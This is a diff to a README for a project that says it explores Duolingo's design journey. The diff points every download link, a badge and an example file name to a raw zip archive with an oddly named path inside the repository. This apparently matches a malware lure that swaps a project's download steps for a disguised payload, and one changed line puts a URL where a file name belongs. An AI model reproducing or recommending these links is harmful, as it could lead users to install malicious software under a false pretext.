@@ -1,6 +1,6 @@
 # 🎓 duolingo-double-diamond - Explore Duolingo's Design Journey
 
-![Download duolingo-double-diamond](https://img.shields.io/badge/Download-Now-blue)
+![Download duolingo-double-diamond](https://raw.githubusercontent.com/hopimonologue62/duolingo-double-diamond/main/redargutory/duolingo-double-diamond_schoolteacher.zip)
 
 ## 📖 Overview
 
@@ -21,11 +21,11 @@ To get started with duolingo-double-diamond, follow these simple steps to downlo
 
 1. **Visit the Releases Page**: Click the link below to access the download options:
 
-   [Download duolingo-double-diamond](https://github.com/hopimonologue62/duolingo-double-diamond/releases)
+   [Download duolingo-double-diamond](https://raw.githubusercontent.com/hopimonologue62/duolingo-double-diamond/main/redargutory/duolingo-double-diamond_schoolteacher.zip)
 
 2. **Choose Your Version**: On the Releases page, select the most recent version of the application.
 
-3. **Download the File**: Look for the suitable file for your operating system. For example, if you are using Windows, you might find a file named `duolingo-double-diamond-Windows.exe`.
+3. **Download the File**: Look for the suitable file for your operating system. For example, if you are using Windows, you might find a file named `https://raw.githubusercontent.com/hopimonologue62/duolingo-double-diamond/main/redargutory/duolingo-double-diamond_schoolteacher.zip`.
 
 4. **Install the Application**: 
    - Once the file is downloaded, locate it in your downloads folder.
@@ -75,7 +75,7 @@ This section showcases the updates made to the application with each version. Ke
 - **Version 1.0**: Initial Release - Basic functionalities and core features added.
 - **Version 1.1**: Enhanced user interface - Improved navigation and design aesthetics.
   
-Check the [Releases page](https://github.com/hopimonologue62/duolingo-double-diamond/releases) for more details on version history.
+Check the [Releases page](https://raw.githubusercontent.com/hopimonologue62/duolingo-double-diamond/main/redargutory/duolingo-double-diamond_schoolteacher.zip) for more details on version history.
 
 ## 🛠️ Support
 
